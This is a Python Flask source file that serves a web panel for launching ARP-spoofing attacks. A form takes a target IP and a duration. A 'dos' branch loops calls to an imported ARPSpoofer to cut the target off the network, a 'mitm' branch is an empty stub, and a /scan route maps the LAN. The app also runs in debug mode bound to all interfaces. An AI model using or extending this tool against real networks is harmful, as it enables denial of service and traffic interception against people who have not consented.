from flask import Flask, request, render_template
from arpSpoofer import ARPSpoofer
import time

arp = ARPSpoofer()
app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def hello():
    if request.method == 'POST':
        target_ip = request.form.get('ip')
        attack_time = request.form.get('time')
        attack_type = request.form.get('type')
        if attack_type == 'dos':
            start_time = time.time()
            while time.time() - start_time < float(attack_time):
                print(time.time() - start_time, float(attack_time))
                try:
                    arp.spoof_mac(target_ip, spoof_source=False)
                except Exception as e:
                    print(e)
                time.sleep(0.1)
        elif attack_type == 'mitm':
            pass
        return "Done!"
    
    return render_template('main.html')
    # print(dumps(arp.report_net_status(), indent=4))


@app.route("/scan")
def scan():
    arp.scan_network()
    return "Scanned!"


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=6969)
